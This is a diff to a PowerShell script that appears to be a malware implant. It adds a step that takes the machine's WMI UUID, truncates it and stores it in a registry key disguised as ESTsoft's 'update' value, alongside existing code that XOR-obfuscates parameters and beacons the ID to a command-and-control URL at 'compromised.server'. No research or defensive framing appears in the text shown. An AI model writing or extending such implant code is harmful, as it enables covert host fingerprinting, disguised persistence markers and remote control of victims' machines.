@@ -14,6 +14,32 @@ function Xor-String {
 
 $c2_url = "http://compromised.server/control/control.php?"
 
+
+##
+## [Part 0] Setting the System Unique ID in the Windows Registry
+## 
+## The path is HKCU\SOFTWARE\ESTsoft, and the value name is "update".
+##
+
+# Get the system's unique ID
+$unique_id = (Get-WmiObject Win32_ComputerSystemProduct).UUID
+# Truncate the ID to 6 characters
+$unique_id = $unique_id.Substring(0, 6)
+
+# Set the path to the registry key
+$registry_path = "HKCU:\SOFTWARE\ESTsoft"
+
+# Create the registry key if it doesn't exist
+if (!(Test-Path $registry_path)) {
+    New-Item -Path $registry_path -Force | Out-Null
+}
+
+# Set the value data and value name
+$value_name = "update"
+
+# Create the registry value
+New-ItemProperty -Path $registry_path -Name $value_name -Value $unique_id -PropertyType String -Force | Out-Null
+
 ##
 ## [Part 1] Sending system unique ID to server in order to initialize
 ##
@@ -21,11 +47,6 @@ $c2_url = "http://compromised.server/control/control.php?"
 ## The format of the URL will be: 
 ##   http://server-url.com/control/control.php?type=ini&data=[unique ID]
 ##
-
-# Get the system's unique ID
-$unique_id = (Get-WmiObject Win32_ComputerSystemProduct).UUID
-# Truncate the ID to 6 characters
-$unique_id = $unique_id.Substring(0, 6)
 
 $type = Xor-String -InputString "type" -XorKey 7
 $type_value = Xor-String -InputString "ini" -XorKey 7
